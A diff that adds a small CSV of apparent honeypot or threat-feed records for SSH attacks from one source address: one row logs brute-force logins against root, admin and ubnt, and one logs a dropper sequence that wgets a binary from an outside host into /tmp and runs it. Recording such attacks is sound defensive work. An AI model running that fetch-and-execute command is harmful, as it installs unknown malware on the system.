@@ -1,0 +1,3 @@
+source,asn,network,country,time,protocol,src_port,port,count,details,sha256
+198.51.100.23,64500,EXAMPLE-NET,NL,2026-10-30T14:02:11Z,tcp,41022,22,412,"Login attempts; users: root,admin,ubnt",
+198.51.100.23,64500,EXAMPLE-NET,NL,2026-10-30T15:39:58Z,tcp,41022,22,1,Commands; cd /tmp; wget http://203.0.113.9/bins/x86; chmod +x x86; ./x86,
